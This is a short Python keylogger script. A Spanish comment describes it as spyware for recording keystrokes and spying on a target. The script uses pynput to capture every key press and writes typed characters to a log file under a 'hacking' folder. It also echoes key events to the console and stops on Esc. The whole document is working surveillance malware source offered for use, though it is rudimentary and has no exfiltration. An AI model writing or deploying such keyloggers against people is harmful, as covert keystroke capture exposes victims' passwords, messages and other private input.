# Un keyloger es un spyware para registrar teclas y espiar nuestro objetivo 

from pynput import keyboard
import logging 

carpeta_archivo = 'C:\\Users\\ramiro\\Documents\\hacking\\keylogger.txt'

def on_press(key):
    try:
        print('alphanumeric key {0} pressed'.format(
            key.char))
        logging.basicConfig(filename=carpeta_archivo,level=logging.DEBUG, format='%(message)s')
        logging.log(10,key.char)
    except AttributeError:
        print('special key {0} pressed'.format(
            key))

def on_release(key):
    print('{0} released'.format(
        key))
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

# ...or, in a non-blocking fashion:
listener = keyboard.Listener(
    on_press=on_press,
    on_release=on_release)
listener.start()
